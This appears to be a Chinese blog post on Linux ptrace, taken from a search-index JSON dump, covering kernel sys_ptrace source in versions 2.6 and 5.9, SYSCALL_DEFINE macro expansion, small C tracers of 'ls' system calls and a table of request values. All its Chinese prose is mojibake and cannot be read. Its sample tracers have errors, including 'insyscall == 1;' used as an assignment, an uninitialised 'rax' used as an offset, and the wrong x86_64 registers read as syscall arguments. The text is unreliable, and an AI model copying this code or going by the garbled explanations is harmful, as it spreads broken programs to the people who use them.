*child; long ret; if (request == PTRACE_TRACEME) { ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); if (!child) { ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } ç³»ç»Ÿè°ƒç”¨éƒ½æ”¹ä¸ºäº†SYSCALL_DEFINEçš„æ–¹å¼ã€‚å¦‚ä½•è·å¾—ä¸Šé¢çš„å®šä¹‰çš„å‘¢ï¼Ÿè¿™é‡Œéœ€è¦ç©¿æ’ä¸€ä¸‹SYSCALL_DEFINEçš„å®šä¹‰(syscall.h): #define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) #define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) #define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) #define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) #define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) #define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) å®å®šä¹‰è¿›è¡Œå±•å¼€ï¼š #define SYSCALL_DEFINEx(x, sname, ...) \\ SYSCALL_METADATA(sname, x, __VA_ARGS__) \\ __SYSCALL_DEFINEx(x, sname, __VA_ARGS__) /* * The asmlinkage stub is aliased to a function named __se_sys_*() which * sign-extends 32-bit ints to longs whenever needed. The actual work is * done within __do_sys_*(). */ #ifndef __SYSCALL_DEFINEx #define __SYSCALL_DEFINEx(x, name, ...) \\ __diag_push(); \\ __diag_ignore(GCC, 8, \"-Wattribute-alias\", \\ \"Type aliasing is used to sanitize syscall arguments\");\\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ __attribute__((alias(__stringify(__se_sys##name)))); \\ ALLOW_ERROR_INJECTION(sys##name, ERRNO); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)); \\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)) \\ { \\ long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\\ __MAP(x,__SC_TEST,__VA_ARGS__); \\ __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__)); \\ return ret; \\ } \\ __diag_pop(); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) #endif /* __SYSCALL_DEFINEx */ __SYSCALL_DEFINExä¸­çš„xè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¸ªæ•°ï¼Œä¸”sys_ptraceçš„å®å®šä¹‰å¦‚ä¸‹ï¼š /* kernel/ptrace.c */ asmlinkage long sys_ptrace(long request, long pid, unsigned long addr, unsigned long data); æ‰€ä»¥å¯¹åº”çš„__SYSCALL_DEFINExåº”è¯¥æ˜¯SYSCALL_DEFINE4ï¼Œè¿™ä¸ä¸Šé¢çš„å®šä¹‰SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)ä¸€è‡´ã€‚ ä»”ç»†è§‚å¯Ÿä¸Šé¢çš„ä»£ç å¯ä»¥å‘ç°ï¼Œå‡½æ•°å®šä¹‰å…¶å®åœ¨æœ€åä¸€è¡Œï¼Œç»“å°¾æ²¡æœ‰åˆ†å·ï¼Œç„¶åå†åŠ ä¸ŠèŠ±æ‹¬å·å³å½¢æˆå®Œæ•´çš„å‡½æ•°å®šä¹‰ã€‚å‰é¢çš„å‡ å¥ä»£ç å¹¶ä¸æ˜¯å‡½æ•°çš„å®ç°ï¼ˆè¯¦ç»†çš„åˆ†æå¯ä»¥è·Ÿè¸ªæºç ï¼Œå‡ºäºç¯‡å¹…åŸå› æ­¤å¤„ä¸æ”¾å‡ºæ¯ä¸ªå®å®šä¹‰çš„è·Ÿè¸ªï¼‰ã€‚ å®šä¹‰çš„è½¬æ¢è¿‡ç¨‹ï¼š SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) --\u003e SYSCALL_DEFINEx(4, _ptrace, __VA_ARGS__) --\u003e __SYSCALL_DEFINEx(4, __ptrace, __VA_ARGS__) #define __SYSCALL_DEFINEx(x, name, ...) \\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ --\u003e asmlinkage long sys_ptrace(__MAP(4,__SC_DECL,__VA_ARGS__)) è€Œå¯¹__MAPå®å’Œ__SC_DECLå®çš„å®šä¹‰å¦‚ä¸‹ï¼š /* * __MAP - apply a macro to syscall arguments * __MAP(n, m, t1, a1, t2, a2, ..., tn, an) will expand to * m(t1, a1), m(t2, a2), ..., m(tn, an) * The first argument must be equal to the amount of type/name * pairs given. Note that this list of pairs (i.e. the arguments * of __MAP starting at the third one) is in the same format as * for SYSCALL_DEFINE\u003cn\u003e/COMPAT_SYSCALL_DEFINE\u003cn\u003e */ #define __MAP0(m,...) #define __MAP1(m,t,a,...) m(t,a) #define __MAP2(m,t,a,","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:2","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. åˆæ­¥ä½¿ç”¨ 1. æœ€ç®€å•çš„lsè·Ÿè¸ª é¦–å…ˆé€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç†Ÿæ‚‰ä¸€ä¸‹ptraceçš„ä½¿ç”¨ï¼š #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/reg.h\u003e #include \u003csys/types.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); // Tell kernel, trace me execl(\"/bin/ls\", \"ls\", NULL); }else{ /*Receive certification after child process stopped*/ wait(NULL); /*Read child process's rax*/ orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); printf(\"[+] The child made a system call %ld.\\n\", orig_rax); /*Continue*/ ptrace(PTRACE_CONT, child, NULL, NULL); } return 0; } è¿è¡Œç»“æœå¦‚ä¸‹ï¼š æ‰“å°å‡ºç³»ç»Ÿè°ƒç”¨å·ï¼Œå¹¶ç­‰å¾…ç”¨æˆ·è¾“å…¥ã€‚æŸ¥çœ‹/usr/include/x86_64-linux-gnu/asm/unistd_64.hæ–‡ä»¶ï¼ˆ64ä½ç³»ç»Ÿï¼‰æŸ¥çœ‹59å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼š 59å·æ°å¥½ä¸ºexecveå‡½æ•°è°ƒç”¨ã€‚å¯¹ä¸Šé¢çš„è¿‡ç¨‹è¿›è¡Œç®€å•æ€»ç»“ï¼š çˆ¶è¿›ç¨‹é€šè¿‡è°ƒç”¨fork()æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­ï¼Œæ‰§è¡Œexecl()ä¹‹å‰ï¼Œå…ˆè¿è¡Œptrace()ï¼Œrequestå‚æ•°è®¾ç½®ä¸ºPTRACE_TRACEMEæ¥å‘Šè¯‰kernelå½“å‰è¿›ç¨‹æ­£åœ¨è¢«traceã€‚å½“æœ‰ä¿¡å·é‡ä¼ é€’åˆ°è¯¥è¿›ç¨‹ï¼Œè¿›ç¨‹ä¼šstopï¼Œæé†’çˆ¶è¿›ç¨‹åœ¨wait()è°ƒç”¨å¤„ç»§ç»­æ‰§è¡Œã€‚ç„¶åè°ƒç”¨execl()ï¼Œæ‰§è¡ŒæˆåŠŸåï¼Œæ–°ç¨‹åºè¿è¡Œå‰ï¼ŒSIGTRAPä¿¡å·é‡è¢«å‘é€åˆ°è¯¥è¿›ç¨‹ï¼Œå­è¿›ç¨‹åœæ­¢ï¼Œçˆ¶è¿›ç¨‹åœ¨wait()è°ƒç”¨å¤„æ”¶åˆ°é€šçŸ¥ï¼Œè·å–å­è¿›ç¨‹çš„æ§åˆ¶æƒï¼ŒæŸ¥çœ‹å­è¿›ç¨‹å†…å­˜å’Œå¯„å­˜å™¨ç›¸å…³ä¿¡æ¯ã€‚ å½“å‘ç”Ÿç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œkernelä¿å­˜äº†raxå¯„å­˜å™¨çš„åŸå§‹å†…å®¹ï¼Œå…¶ä¸­å­˜æ”¾çš„æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨requestå‚æ•°ä¸ºPTRACE_PEEKUSERçš„ptraceæ¥ä»å­è¿›ç¨‹çš„USERæ®µè¯»å–å‡ºè¯¥å€¼ã€‚ ç³»ç»Ÿè°ƒç”¨æ£€æŸ¥ç»“æŸåï¼Œå­è¿›ç¨‹é€šè¿‡è°ƒç”¨requestå‚æ•°ä¸ºPTRACE_CONTçš„ptraceå‡½æ•°ç»§ç»­æ‰§è¡Œã€‚ 2. ç³»ç»Ÿè°ƒç”¨æŸ¥çœ‹å‚æ•° #include \u003csys/ptrace.h\u003e #include \u003csys/types.h\u003e #include \u003csys/wait.h\u003e #include \u003cunistd.h\u003e #include \u003csys/user.h\u003e #include \u003csys/reg.h\u003e #include \u003cstdio.h\u003e #include \u003csys/syscall.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); execl(\"/bin/ls\", \"ls\", NULL); }else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall = 1; params[0] = ptrace(PTRACE_PEEKUSER, child, 8 * RBX, NULL); params[1] = ptrace(PTRACE_PEEKUSER, child, 8 * RCX, NULL); params[2] = ptrace(PTRACE_PEEKUSER, child, 8 * RDX, NULL); printf(\"Write called with %ld, %ld, %ld\\n\", params[0], params[1], params[2]); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8 * RAX, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } æ‰§è¡Œç»“æœï¼š åœ¨ä¸Šé¢çš„ç¨‹åºä¸­ï¼Œè·Ÿè¸ªçš„æ˜¯wirteçš„ç³»ç»Ÿè°ƒç”¨ï¼Œlså‘½ä»¤æ€»è®¡è¿›è¡Œäº†ä¸‰æ¬¡writeçš„è°ƒç”¨ã€‚requestå‚æ•°ä¸ºPTEACE_SYSCALLæ—¶çš„ptraceä½¿kernelåœ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨è¿›å…¥æˆ–é€€å‡ºæ—¶stopå­è¿›ç¨‹ï¼Œè¿™ç­‰ä»·äºæ‰§è¡ŒPTRACE_CONTå¹¶åœ¨ä¸‹ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨è¿›å…¥æˆ–é€€å‡ºæ—¶stopã€‚ waitç³»ç»Ÿè°ƒç”¨ä¸­çš„statuså˜é‡ç”¨äºæ£€æŸ¥å­è¿›ç¨‹æ˜¯å¦å·²é€€å‡ºï¼Œè¿™æ˜¯ç”¨æ¥æ£€æŸ¥å­è¿›ç¨‹æ˜¯å¦è¢«ptraceåœæ‰æˆ–æ˜¯å¦é€€å‡ºçš„å…¸å‹æ–¹æ³•ã€‚è€Œå®WIFEXITEDåˆ™è¡¨ç¤ºäº†å­è¿›ç¨‹æ˜¯å¦æ­£å¸¸ç»“æŸï¼ˆä¾‹å¦‚é€šè¿‡è°ƒç”¨exitæˆ–è€…ä»mainè¿”å›ç­‰ï¼‰ï¼Œæ­£å¸¸ç»“æŸæ—¶è¿”å›trueã€‚ 3. ç³»ç»Ÿè°ƒç”¨å‚æ•°-æ”¹è¿›ç‰ˆ å‰é¢æœ‰ä»‹ç»PTRACE_GETREGSå‚æ•°ï¼Œä½¿ç”¨å®ƒæ¥è·å–å¯„å­˜å™¨çš„å€¼ç›¸æ¯”å‰é¢ä¸€ç§æ–¹æ³•è¦ç®€å•å¾ˆå¤šï¼š #include \u003cstdio.h\u003e #include \u003csys/reg.h\u003e #include \u003csys/user.h\u003e #include \u003csys/wait.h\u003e #include \u003csys/ptrace.h\u003e #include \u003csys/syscall.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; struct user_regs_struct regs; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, child, 8 * ORIG_RAX, NULL); execl(\"/bin/ls\", \"ls\", NULL); } else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall == 1; ptrace(PTRACE_GETREGS, child, NULL, \u0026regs); printf(\"Write called with %lld, %lld, %lld\\n\", regs.rbx, regs.rcx, regs.rdx); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8*rax, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } æ‰§è¡Œç»“æœï¼š æ•´ä½“è¾“å‡ºä¸å‰é¢çš„ä»£ç æ— æ‰€å·®åˆ«ï¼Œä½†åœ¨ä»£ç å¼€å‘ä¸Šä½¿ç”¨äº†PTRACE_GETREGSæ¥è·å–å­è¿›ç¨‹çš„å¯„å­˜å™¨çš„å€¼ï¼Œç®€æ´äº†å¾ˆå¤šã€‚ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:2:3","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"ä¸‰ã€sys_ptraceå‡½æ•°æºç åˆ†æ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:0","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. Linux-2.6ç‰ˆæœ¬çš„æºç åˆ†æ 1. æºç åˆ†æ é¦–å…ˆçœ‹ä¸€ä¸‹linux-2.6.0çš„sys_ptraceçš„å¤„ç†æµç¨‹ï¼ˆä»¥/arch/i386/kernel/ptrace.cä¸ºä¾‹ï¼‰ï¼š /* * Note that this implementation of ptrace behaves differently from vanilla * ptrace. Contrary to what the man page says, in the PTRACE_PEEKTEXT, * PTRACE_PEEKDATA, and PTRACE_PEEKUSER requests the data variable is not * ignored. Instead, the data variable is expected to point at a location * (in user space) where the result of the ptrace call is written (instead of * being returned). */ asmlinkage int sys_ptrace(long request, long pid, long addr, long data) { struct task_struct *child; struct user * dummy = NULL; int i, ret; lock_kernel(); ret = -EPERM; if (request == PTRACE_TRACEME) { // è¯·æ±‚ä¸ºPTRACE_TRACEME /* æ£€æŸ¥æ˜¯å¦åšå¥½è¢«è·Ÿè¸ªçš„å‡†å¤‡ */ if (current-\u003eptrace \u0026 PT_PTRACED) goto out; ret = security_ptrace(current-\u003eparent, current); if (ret) goto out; /* æ£€æŸ¥é€šè¿‡ï¼Œåœ¨process flagsä¸­è®¾ç½®ptraceä½*/ current-\u003eptrace |= PT_PTRACED; ret = 0; goto out; } /* éPTRACE_TRACEMEçš„è¯·æ±‚*/ ret = -ESRCH; // é¦–å…ˆè®¾ç½®è¿”å›å€¼ä¸ºESRCHï¼Œè¡¨æ˜æ²¡æœ‰è¯¥è¿›ç¨‹ï¼Œå®å®šä¹‰åœ¨errno-base.hå¤´æ–‡ä»¶ä¸­ read_lock(\u0026tasklist_lock); child = find_task_by_pid(pid); // æŸ¥æ‰¾taskç»“æ„ if (child) get_task_struct(child); read_unlock(\u0026tasklist_lock); if (!child) // æ²¡æœ‰æ‰¾åˆ°taskç»“æ„ï¼ŒæŒ‡æ˜æ‰€ç»™pidé”™è¯¯ goto out; ret = -EPERM; // è¿”å›æ“ä½œæœªæˆæƒ if (pid == 1) // initè¿›ç¨‹ä¸å…è®¸è¢«è°ƒè¯• goto out_tsk; /* è¯·æ±‚ä¸º PTRACE_ATTACH æ—¶*/ if (request == PTRACE_ATTACH) { ret = ptrace_attach(child); // è¿›è¡Œattach goto out_tsk; } /* æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¢«è·Ÿè¸ªï¼Œæ²¡æœ‰çš„è¯ä¸èƒ½æ‰§è¡Œå…¶ä»–åŠŸèƒ½ï¼› * å½“ä¸æ˜¯PTRACE_KILLæ—¶ï¼Œè¦æ±‚è¿›ç¨‹çŠ¶æ€ä¸ºTASK_STOPPEDï¼› * è¢«è·Ÿè¸ªè¿›ç¨‹å¿…é¡»ä¸ºå½“å‰è¿›ç¨‹çš„å­è¿›ç¨‹ * åœ¨ä¹‹å‰æ˜¯ç›´æ¥åœ¨è¯¥ä»£ç å¤„å®ç°ä»¥ä¸Šé€»è¾‘ï¼Œç°åœ¨é‡æ–°å°†ä»¥ä¸ŠåŠŸèƒ½å°è£…æˆäº†ptrace_check_attachå‡½æ•° */ ret = ptrace_check_attach(child, request == PTRACE_KILL); if (ret \u003c 0) goto out_tsk; /* ä»¥ä¸‹å°±ä¸ºæ ¹æ®ä¸åŒçš„requestå‚æ•°è¿›è¡Œå¯¹åº”çš„å¤„ç†äº†ï¼Œç”¨ä¸€ä¸ªswitchæ¥æ€»æ‹¬ï¼Œæµç¨‹æ¯”è¾ƒç®€å•ã€‚*/ switch (request) { /* when I and D space are separate, these will need to be fixed. è¿™ç®—é¢„å‘Šå—ï¼Ÿ23333*/ case PTRACE_PEEKTEXT: /* read word at location addr. */ case PTRACE_PEEKDATA: { unsigned long tmp; int copied; copied = access_process_vm(child, addr, \u0026tmp, sizeof(tmp), 0); ret = -EIO; // è¿”å›I/Oé”™è¯¯ if (copied != sizeof(tmp)) break; ret = put_user(tmp,(unsigned long *) data); break; } /* read the word at location addr in the USER area. */ case PTRACE_PEEKUSR: { unsigned long tmp; ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; tmp = 0; /* Default return condition */ if(addr \u003c FRAME_SIZE*sizeof(long)) tmp = getreg(child, addr); if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ addr -= (long) \u0026dummy-\u003eu_debugreg[0]; addr = addr \u003e\u003e 2; tmp = child-\u003ethread.debugreg[addr]; } ret = put_user(tmp,(unsigned long *) data); break; } /* when I and D space are separate, this will have to be fixed. */ case PTRACE_POKETEXT: /* write the word at location addr. */ case PTRACE_POKEDATA: ret = 0; if (access_process_vm(child, addr, \u0026data, sizeof(data), 1) == sizeof(data)) break; ret = -EIO; break; case PTRACE_POKEUSR: /* write the word at location addr in the USER area */ ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; if (addr \u003c FRAME_SIZE*sizeof(long)) { ret = putreg(child, addr, data); break; } /* We need to be very careful here. We implicitly want to modify a portion of the task_struct, and we have to be selective about what portions we allow someone to modify. */ ret = -EIO; if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ if(addr == (long) \u0026dummy-\u003eu_debugreg[4]) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[5]) break; if(addr \u003c (long) \u0026dummy-\u003eu_debugreg[4] \u0026\u0026 ((unsigned long) data) \u003e= TASK_SIZE-3) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[7]) { data \u0026= ~DR_CONTROL_RESERVED; for(i=0; i\u003c4; i++) if ((0x5f54 \u003e\u003e ((data \u003e\u003e (16 + 4*i)) \u0026 0xf)) \u0026 1) goto out_tsk; } addr -= (long) \u0026dummy-\u003eu_debugreg; addr = addr \u003e\u003e 2; child-\u003ethread.debugreg[addr] = data; ret = 0; } break; case PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */ case PTRACE_CONT: { /* restart after signal. */ long tmp; ret = -EIO; if ((unsigned long) data \u003e _NSIG) break; if (request == PTRACE_SYSCALL) { set_tsk_thread_flag","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:1","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. Linux-5.9ç‰ˆæœ¬çš„æºç åˆ†æ 1. æºç åˆ†æ Linux-5.9ç‰ˆæœ¬çš„æºç åˆ†æï¼š SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { // è¯·æ±‚æ˜¯å¦ä¸ºPTRACE_TRACEME ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); // é€šè¿‡pidè¯·æ±‚taskç»“æ„ if (!child) { // è¯·æ±‚å¤±è´¥ï¼Œè¿”å›ESRCH ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; /* æ ¹æ®ä¸åŒçš„æ¶æ„è¿›è¡Œä¸åŒçš„å¤„ç† */ ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 2. æµç¨‹æ¢³ç† æ¢³ç†ä¸Šè¿°æºç ï¼Œå¯ä»¥å¾—åˆ°å‡½æ•°æµç¨‹å›¾å¦‚ä¸‹ï¼š 3. å…¶ä»– Linux-5.9ä¸­ä½¿ç”¨äº†å®çš„æ–¹å¼ï¼Œåœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨æ—¶å…ˆè¿›è¡Œå‡½æ•°æ›¿æ¢è§£æå‡ºå®Œæ•´çš„å‡½æ•°ä½“å†è¿›è¡Œå…·ä½“æ‰§è¡Œï¼ˆè¯¦ç»†æ›¿æ¢å¯å‚è€ƒç³»åˆ—ï¼ˆä¸€ï¼‰ä¸­çš„å‡½æ•°å®šä¹‰éƒ¨åˆ†å†…å®¹ï¼‰ã€‚è€Œä¸”ä¸Linux-2.6ä¸åŒçš„æ˜¯ï¼Œkernel/ptrace.cè´Ÿè´£æ€»ä½“è°ƒåº¦ï¼Œä½¿ç”¨arch_ptraceè¿›è¡Œä¸åŒæ¶æ„çš„å¤„ç†çš„é€‰æ‹©ï¼š Linux-5.9ç‰ˆæœ¬çš„è¿™ç§æ”¹åŠ¨ç›¸æ¯”Linux-2.6çš„è®¾è®¡ï¼Œæ›´ä¸ºæ¸…æ™°ä¹Ÿæ›´ä¸ºå®‰å…¨ï¼ˆä¸ªäººååˆ†å–œæ¬¢è¿™ç§è®¾è®¡ï¼Œç”±è¡·ä½©æœè¿™äº›ä¼˜ç§€çš„å¼€å‘è€…ï¼‰ã€‚ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:3:2","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"å››ã€Requestå‚æ•°è¯¦è§£ ","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:0","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"1. å‚æ•°ç®€è¿° ptraceæ€»è®¡æœ‰4ä¸ªå‚æ•°ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°â€“requestï¼Œè¯¥å‚æ•°å†³å®šäº†å…·ä½“æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½ã€‚å¯å–å€¼å¦‚ä¸‹ï¼ˆéƒ¨åˆ†ï¼‰ï¼š Request Description PTRACE_TRACEME è¿›ç¨‹è¢«å…¶çˆ¶è¿›ç¨‹è·Ÿè¸ªï¼Œå…¶çˆ¶è¿›ç¨‹åº”è¯¥å¸Œæœ›è·Ÿè¸ªå­è¿›ç¨‹ã€‚è¯¥å€¼ä»…è¢«traceeä½¿ç”¨ï¼Œå…¶ä½™çš„requestå€¼ä»…è¢«tracerä½¿ç”¨ PTRACE_PEEKTEXT, PTRACE_PEEKDATA ä»traceeçš„addræŒ‡å®šçš„å†…å­˜åœ°å€ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ä½œä¸ºptrace()è°ƒç”¨çš„ç»“æœ PTRACE_PEEKUSER ä»traceeçš„USERåŒºåŸŸä¸­ä¾¿å®œä¸ºaddrå¤„è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œè¯¥å€¼ä¿å­˜äº†è¿›ç¨‹çš„å¯„å­˜å™¨å’Œå…¶ä»–ä¿¡æ¯ PTRACE_POKETEXT, PTRACE_POKEDATA å‘traceeçš„addrå†…å­˜åœ°å€å¤„å¤åˆ¶ä¸€ä¸ªå­—èŠ‚æ•°æ® PTRACE_POKEUSER å‘traceeçš„USERåŒºåŸŸä¸­åç§»ä¸ºaddråœ°å€å¤„å¤åˆ¶ä¸€ä¸ªå­—èŠ‚æ•°æ® PTRACE_GETREGS å¤åˆ¶traceeçš„é€šç”¨å¯„å­˜å™¨åˆ°tracerçš„dataå¤„ PTRACE_GETFPREGS å¤åˆ¶traceeçš„æµ®ç‚¹å¯„å­˜å™¨åˆ°tracerçš„dataå¤„ PTRACE_GETREGSET è¯»å–traceeçš„å¯„å­˜å™¨ PTRACE_SETREGS è®¾ç½®traceeçš„é€šç”¨å¯„å­˜å™¨ PTRACE_SETFPREGS è®¾ç½®traceeçš„æµ®ç‚¹å¯„å­˜å™¨ PTRACE_CONT é‡æ–°è¿è¡ŒstoppedçŠ¶æ€çš„traceeè¿›ç¨‹ PTRACE_SYSCALL é‡æ–°è¿è¡ŒstoppedçŠ¶æ€çš„traceeè¿›ç¨‹ï¼Œä½†æ˜¯ä½¿traceeåœ¨ç³»ç»Ÿè°ƒç”¨çš„ä¸‹ä¸€ä¸ªentryæˆ–ä»ç³»ç»Ÿè°ƒç”¨é€€å‡ºæˆ–åœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åstop PTRACE_SINGLESTEP è®¾ç½®å•æ­¥æ‰§è¡Œæ ‡å¿— PTRACE_ATTACH è·Ÿè¸ªæŒ‡å®špidçš„è¿›ç¨‹ PTRACE_DETACH ç»“æŸè·Ÿè¸ª å¤‡æ³¨ï¼šä¸Šè¿°å‚æ•°ä¸­ï¼ŒPTRACE_GETREGS, PTRACE_SETREGS, PTRACE_GETFPREGS, PTRACE_SETFPREGSå‚æ•°ä¸ºInterl386ç‰¹æœ‰ã€‚ å„å‚æ•°æ‰€ä»£è¡¨çš„å€¼ç”±/usr/include/sys/ptrace.hæ–‡ä»¶æŒ‡å®šï¼š ","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:1","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["LINUX"],"content":"2. é‡è¦å‚æ•°è¯¦è§£ ä¸‹é¢å°†å¯¹requestä¸­å‡ ä¸ªå¸¸è§ã€é‡è¦çš„å‚æ•°è¿›è¡Œè¯¦ç»†è§£æï¼š 1. PTRACE_TRACEME æè¿° æœ¬è¿›ç¨‹è¢«å…¶çˆ¶è¿›ç¨‹è·Ÿè¸ªï¼Œå¦‚æœå­è¿›ç¨‹æ²¡æœ‰è¢«å…¶çˆ¶è¿›ç¨‹è·Ÿè¸ªï¼Œä¸èƒ½ä½¿ç”¨è¯¥é€‰é¡¹ã€‚PTRACE_TRACEME åªè¢«traceeä½¿ç”¨ã€‚ å®šä¹‰ /** * ptrace_traceme -- helper for PTRACE_TRACEME * * Performs checks and sets PT_PTRACED. * Should be used by all ptrace implementations for PTRACE_TRACEME. */ static int ptrace_traceme(void) { int ret = -EPERM; write_lock_irq(\u0026tasklist_lock); // é¦–å…ˆè®©writeræ‹¿åˆ°è¯»å†™lockï¼Œå¹¶ä¸”ä¼šdisable local irp /* Are we already being traced? */ // æ˜¯å¦å·²ç»å¤„äºptraceä¸­ if (!current-\u003eptrace) { ret = security_ptrace_traceme(current-\u003eparent); /* * Check PF_EXITING to ensure -\u003ereal_parent has not passed * exit_ptrace(). Otherwise we don't report the error but * pretend -\u003ereal_parent untraces us right after return. */ if (!ret \u0026\u0026 !(current-\u003ereal_parent-\u003eflags \u0026 PF_EXITING)) { // æ£€æŸ¥é€šè¿‡ï¼Œå°†å­è¿›ç¨‹é“¾æ¥åˆ°çˆ¶è¿›ç¨‹çš„ptraceé“¾è¡¨ä¸­ current-\u003eptrace = PT_PTRACED; ptrace_link(current, current-\u003ereal_parent); } } 